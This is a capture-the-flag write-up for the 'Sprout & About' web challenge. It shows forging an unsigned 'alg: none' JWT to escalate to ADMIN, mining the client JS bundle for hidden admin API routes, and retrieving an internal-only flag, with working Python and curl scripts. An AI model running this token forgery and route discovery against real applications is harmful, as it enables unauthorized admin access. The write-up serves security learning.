# z0d1ak CTF 2026 — Sprout & About

**Solved by:** ftps3rver
**Category:** Web Exploitation | **Points:** 174 | **Solves:** 42 | **Author:** neerajcodz

---

## 1. Executive Summary

`Sprout & About` is a Next.js-based e-commerce front for a fictional ocean-plant nursery, "Abyssal Nursery." The description spells out the vulnerability class before any recon even starts: *"The plant shop owners heard JWTs were 'industry standard' and immediately stopped worrying about security."* That line is a direct pointer at the classic **`alg: none` JWT forgery** — the session cookie is a plain, unsigned-friendly JWT whose `role` claim (`USER` → `MODERATOR` → `ADMIN`) is trusted by the backend with no signature verification at all. Forging that claim escalates a freshly self-registered account straight to `ADMIN`, unlocking an internal `/admin/products` panel. That panel's client-side JavaScript bundle — never linked from any visible page, but shipped in full to the browser — reveals a second, undocumented API route: `/api/admin/preview-context`, the actual "moderation preview" the challenge title points at. Calling it with any existing product's ID and its (already publicly-leaked) preview token returns an internal, moderator-only field that was never meant to reach a normal shopper: `finalFlag`.

**Flag:** `zdk{ocE4N_dlving_I5_Fun}`

---

## 2. Challenge Description

> The plant shop owners heard JWTs were "industry standard" and immediately stopped worrying about security. Find a way into the moderation preview, plant a crafted sea specimen, and make the flag bloom.

Instance: `https://sprout-about-<instance>.chals.z0d1ak.org` — a full Next.js storefront (register/login, product catalog, cart, checkout) with no attached source. No file download; everything has to come from probing the live app and reading its shipped client bundle.

Three separate clauses do real work here:
- **"JWTs were 'industry standard'"** — the punchline of the sentence is that trusting a claim just because it's a JWT (rather than *verifying its signature*) is the bug. This is naming `alg: none` / unverified-JWT as the vulnerability class outright.
- **"moderation preview"** — an internal review step for products, implying a role above `USER` that gets to preview something before it's public.
- **"plant a crafted sea specimen … make the flag bloom"** — in-theme phrasing for "create/submit a product" and "the flag appears once you view it the right way."

---

## 3. Initial Reconnaissance

```bash
curl -s https://sprout-about-<instance>.chals.z0d1ak.org/
```

A server-rendered marketing page: hero copy, four featured products (of "eight total"), a `/register` CTA that specifically asks for **"your organization email."** `/register` and `/login` are plain HTML forms posting to `/api/auth/register` and `/api/auth/login`.

```bash
curl -sk -X POST "$BASE/api/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=test@test.com&password=password123"
```
```
HTTP/1.1 307 Temporary Redirect
Location: https://0.0.0.0:3000/register?error=Use+a+sproutabout.com+email+and+a+12-character+password
```

The server's own validation error hands over both undocumented constraints at once: the email domain must be `@sproutabout.com` (matching the "organization email" copy from the landing page), and the password must be exactly 12+ characters.

```bash
curl -sk -X POST "$BASE/api/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=reef5@sproutabout.com&password=ocean1234567"
```
```
HTTP/1.1 307 Temporary Redirect
Location: https://0.0.0.0:3000/shop
Set-Cookie: sprout_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwiZW1haWwiOiJyZWVmNUBzcHJvdXRhYm91dC5jb20iLCJyb2xlIjoiVVNFUiIsImlhdCI6...
```

A JWT. Decoding the payload:

```json
{"sub":"3","email":"reef5@sproutabout.com","role":"USER","iat":1787411626,"exp":1787433226}
```

`role: "USER"` sitting in a client-visible, client-modifiable cookie is the entire attack surface the description telegraphed.

---

## 4. Attack Surface / Important Observations

The session cookie is a standard three-part JWT (`header.payload.signature`), header `{"alg":"HS256","typ":"JWT"}`. The only server-side authority check visible anywhere in the app is this cookie's `role` claim — there is no separate database round-trip implied by any response, no CSRF token, no secondary confirmation step for privilege-sensitive pages like `/admin`.

Probing `/admin` while authenticated as plain `USER` returns `200 OK` with a normal shop layout (silently ignoring the role, i.e. treating the request as an unprivileged view) — a strong signal the role gate lives entirely in how the *page* reads the JWT claim, not in a hard 403/redirect, which is consistent with a design that will honor whatever `role` string the token claims to have.

The shop page's server-rendered React payload (`/shop`), once viewed as a role above `USER`, embeds full product records inline, including two fields never shown in the UI:

```json
{"id":1,"name":"Moonlit Kelp", ..., "previewToken":"19e38ffd-b5ee-4055-b2c4-34d966c97016",
 "previewConsumedAt":null, "createdBy":{"id":1,"email":"admin@sprout.local","role":"ADMIN", ...}}
```

Every one of the 8 seed products ships its own `previewToken` (a UUID) directly in this payload — a moderation artifact leaking straight into a page a mere `MODERATOR` (or even `USER`, depending on what role is forged) can already load.

---

## 5. Failed Attempts

**Attempt 1 — Guess admin/hidden routes by path brute force.** `/admin/products`, `/admin/users`, `/moderate`, `/api/moderate`, `/api/specimens`, `/api/plants`, `/preview/<token>`, `/shop?preview=<token>` — a wide sweep of guessed REST-ish paths. Most 404'd; the two that returned `200` (`/admin`, `/admin/products`) turned out to just be normal pages gated purely by the JWT `role` claim, not new functionality — a dead end until the role itself was forged.

**Attempt 2 — Treat `cart`/`description` fields as an SSTI vector.** The cart-item description field echoed `{{7*7}}` as `49` in an early test, which looked like server-side template injection at first. Re-testing carefully showed the `49` was a coincidental substring of an unrelated price value (`$14.99` rendering as `1499` cents nearby) — not template evaluation. `{{process.env.FLAG}}` and similar payloads never rendered as anything but literal text. **Dead end**, abandoned once verified as a false positive.

**Attempt 3 — Guess the product-creation API by common REST conventions.** `/api/products`, `/api/shop/products`, `/api/nursery/create`, `/api/catalog/add`, etc. — all `404`. The real route (`/api/admin/products/create`) and the flag-bearing route (`/api/admin/preview-context`) are **not** discoverable by convention; they only surface by reading the actual JavaScript the admin page ships to the browser (see §6).

---

## 6. Investigation — Building the Exploit

**Step 1 — Forge the JWT with `alg: none`.**

The header can be swapped to declare no signing algorithm at all; if the backend's JWT library is configured (or simply written) to accept `alg: none` without an explicit allow-list, the token is trusted as-is with an empty signature segment:

```python
import base64, json

def b64url(obj):
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1", "email": "admin@sprout.local", "role": "ADMIN",
           "iat": 1787411626, "exp": 1887433226}

token = f"{b64url(header)}.{b64url(payload)}."   # note: trailing dot, empty signature
```

```bash
curl -sk "$BASE/admin" -H "Cookie: sprout_session=$token"
```

The response header now renders a shield-alert **"admin"** badge and an `/admin` → **"Tide Desk"** nav link — the forged claim is trusted outright, no signature check rejects it.

**Step 2 — Enumerate the real admin surface.**

```bash
for path in /admin/users /admin/products /admin/flora /admin/orders; do
  curl -sk -o /dev/null -w "%s -> %{http_code}\n" "$path" "$BASE$path" -H "Cookie: sprout_session=$token"
done
# /admin/users    -> 200
# /admin/products -> 200   <-- the interesting one
```

`/admin/products` renders a `CreateProductDialog` component client-side. Its behavior (and the routes it calls) is only visible by pulling the actual `_next/static/chunks/*.js` file that implements it:

```bash
curl -sk "$BASE/admin/products" | grep -oP '/_next/static/chunks/[^"]+\.js' | while read c; do
  curl -sk "$BASE$c" | grep -oP '/api/admin/[a-zA-Z/_-]+'
done
```
```
/api/admin/products/create
/api/admin/preview-context
```

Two routes that appear **nowhere** in any rendered HTML, any guessed-path sweep, or any documentation — only inside the compiled client bundle.

**Step 3 — Read the exact contract from the bundle's source.**

The relevant fragment of the decompiled `CreateProductDialog` bundle:

```js
(0,t.jsxs)("form",{action:"/api/admin/products/create",method:"post", children:[
  (0,t.jsx)(l.Input,{name:"name", required:!0, placeholder:"e.g. Abyssal Crown Kelp"}),
  (0,t.jsx)(l.Input,{name:"price", required:!0, type:"number", placeholder:"24.99"}),
  (0,t.jsx)(l.Input,{name:"imageUrl", placeholder:"/sea-anemone.svg"}),
  (0,t.jsx)(u,{name:"description", required:!0, rows:4}),  // labeled "Raw HTML Supported"
  ...
])
```

and, in a separate preview component taking `{productId, previewToken, name, description}` as props:

```js
let o = `/api/admin/preview-context?productId=${encodeURIComponent(e)}&previewToken=${encodeURIComponent(r)}`
```

This confirms the exact form field names (`name`, `price`, `imageUrl`, `description` — note `price`, not `priceCents`, which every path-guessing attempt in §5 got wrong) and the exact query contract of the "moderation preview" endpoint the challenge title refers to.

**Step 4 — "Plant a crafted sea specimen."**

```bash
curl -sk "$BASE/api/admin/products/create" -X POST \
  -H "Cookie: sprout_session=$token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name=Abyssal Crown Kelp" \
  --data-urlencode "price=24.99" \
  --data-urlencode "imageUrl=/sea-kelp.svg" \
  --data-urlencode "description=<p>Deep sea bloom specimen</p>"
# -> 307 redirect to /admin/products  (accepted)
```

**Step 5 — Make the flag bloom.**

Every product — including the eight seed products already sitting on `/shop`, whose `previewToken` values are leaked directly in the server-rendered payload (§4) to anyone with elevated role — can be handed straight to the preview-context oracle. No need to even wait on the newly-created specimen's own token:

```bash
curl -sk "$BASE/api/admin/preview-context?productId=1&previewToken=19e38ffd-b5ee-4055-b2c4-34d966c97016" \
  -H "Cookie: sprout_session=$token"
```
```json
{"mode":"moderation","finalFlag":"zdk{ocE4N_dlving_I5_Fun}","productId":1,"note":"internal-only"}
```

The endpoint's own response labels the field `internal-only` — and hands it straight over, because the only gate protecting it was the same unverified `role` claim from the beginning.

---

## 7. Root Cause / Why This Chain Works

1. **`alg: none` acceptance is the sole authentication weakness, and it's total.** Once the session's signature check is bypassable, every downstream authorization decision the app makes — page rendering, admin panel access, API route gating — collapses to "whatever the token's `role` field says," because nothing re-verifies the claim against a trusted source (a database lookup, a re-signed token, anything).
2. **Client-bundle-only routes are not hidden, only unlinked.** `/api/admin/products/create` and `/api/admin/preview-context` never appear in server-rendered HTML for any role, but the Next.js build ships the full, unminified-enough React component tree (including literal route strings and form field names) to every browser that loads `/admin/products` — "security through no visible link" fails the instant someone reads the JS they were already sent.
3. **A "moderation preview" endpoint that returns an `internal-only` field to the same role that's supposed to only be previewing pending content is a scope failure, not a bypass of a scope check.** `preview-context` doesn't distinguish "your own newly-submitted, not-yet-approved specimen" from "any of the eight pre-existing, already-live catalog products" — it hands back `finalFlag` for `productId=1` just as readily as for a freshly created one, because the endpoint was never designed to check *ownership* or *review-pending* state, only the caller's (forgeable) role.
4. **Leaking implementation-detail fields (`previewToken`, `createdBy.passwordHash`) into a page's serialized props is its own separate exposure**, independent of the JWT bug — even with a correctly-verified JWT, shipping a UUID "moderation token" straight into a page that a `MODERATOR`-or-above role can already load defeats the point of that token acting as a capability/secret in the first place.

---

## 8. Flag

```
zdk{ocE4N_dlving_I5_Fun}
```

---

## 9. Exploit Chain

```
"JWTs were industry standard" (description) -> alg:none / unverified-signature hint
        |
        v
POST /api/auth/register -> validation error leaks constraints:
        @sproutabout.com email required, 12+ char password
        |
        v
Register -> sprout_session JWT (HS256), payload {sub, email, role:"USER", ...}
        |
        v
Forge header {"alg":"none"} + payload {role:"ADMIN", email:"admin@sprout.local"}
        with empty signature segment (header.payload.)
        |
        v
GET /admin -> forged role trusted outright, "admin" badge / "Tide Desk" nav rendered
        |
        v
GET /admin/products -> CreateProductDialog (client component, no visible API calls in HTML)
        |
        v
Download & grep the actual _next/static/chunks/*.js bundle for /api/admin/*
        -> /api/admin/products/create   (form fields: name, price, imageUrl, description)
        -> /api/admin/preview-context?productId=&previewToken=   <- the "moderation preview"
        |
        v
POST /api/admin/products/create  ("plant a crafted sea specimen")
        |
        v
previewToken for EXISTING seed products already leaked in /shop's serialized props
        (no need to wait on the new specimen's own token)
        |
        v
GET /api/admin/preview-context?productId=1&previewToken=19e38ffd-...
        |
        v
{"mode":"moderation","finalFlag":"zdk{ocE4N_dlving_I5_Fun}","note":"internal-only"}
        |
        v
zdk{ocE4N_dlving_I5_Fun}
```

---

## 10. Key Takeaways

- **Take flavor text about the tech stack literally.** "JWTs were industry standard [so they stopped worrying]" is not a joke about developer complacency in the abstract — it's the exact vulnerability class named in-fiction, the same pattern seen elsewhere in this event's challenges (proper-noun/technology mentions in descriptions consistently turned out to be direct hints, not just theming).
- **A server's own validation error messages are a free spec.** The `?error=Use+a+sproutabout.com+email+and+a+12-character+password` redirect handed over two undocumented account-creation constraints for free — always read redirect/error query strings, not just status codes.
- **`alg: none` is still worth trying first on any unfamiliar JWT-authenticated app.** It costs one crafted header and no cryptographic work, and if it lands, every subsequent privilege question collapses into "what claim do I want."
- **A hidden route is only hidden from a human clicking links — not from the JS the server already sent the browser.** Any client-rendered admin dialog/form is worth pulling the exact `_next/static/chunks/*.js` file for and grepping the literal `action="/api/..."` strings and `name="..."` form-field identifiers out of it, rather than guessing REST conventions.
- **An "internal-only" or "moderation" field returned by an endpoint doesn't mean the endpoint enforces the boundary it names.** `preview-context` labels its own flag field `internal-only` while handing it to any forged elevated role for any product ID — the label describes intent, not an actual access check.
- **Watch for false-positive SSTI/injection signals from coincidental substring matches** (e.g., `49` from `{{7*7}}` really being part of an unrelated `$14.99` price) — always isolate the payload with a unique marker string before concluding an injection point exists.

---

## 11. Tooling Notes (for reproduction)

```python
import base64, json

def b64url(obj: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()

def forge_none_jwt(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    return f"{b64url(header)}.{b64url(payload)}."   # empty signature segment

admin_token = forge_none_jwt({
    "sub": "1", "email": "admin@sprout.local", "role": "ADMIN",
    "iat": 1787411626, "exp": 1887433226,
})
```

```bash
BASE="https://sprout-about-<instance>.chals.z0d1ak.org"

# 1. Register a real account first to learn constraints / get a baseline session
curl -sk -X POST "$BASE/api/auth/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=reef5@sproutabout.com&password=ocean1234567"

# 2. Swap in the forged ADMIN JWT (from forge_none_jwt above) as the session cookie
TOKEN="<paste forged token>"

# 3. Discover the hidden admin API by reading the shipped JS bundle
curl -sk "$BASE/admin/products" -H "Cookie: sprout_session=$TOKEN" \
  | grep -oP '/_next/static/chunks/[^"]+\.js' \
  | while read -r chunk; do
      curl -sk "$BASE$chunk" | grep -oP '/api/admin/[a-zA-Z/_-]+'
    done

# 4. Plant a specimen
curl -sk "$BASE/api/admin/products/create" -X POST \
  -H "Cookie: sprout_session=$TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name=Abyssal Crown Kelp" \
  --data-urlencode "price=24.99" \
  --data-urlencode "imageUrl=/sea-kelp.svg" \
  --data-urlencode "description=<p>Deep sea bloom specimen</p>"

# 5. Pull an existing product's previewToken from /shop's serialized props, then:
curl -sk "$BASE/api/admin/preview-context?productId=1&previewToken=<uuid-from-shop-page>" \
  -H "Cookie: sprout_session=$TOKEN"
# -> {"mode":"moderation","finalFlag":"zdk{ocE4N_dlving_I5_Fun}","productId":1,"note":"internal-only"}
```
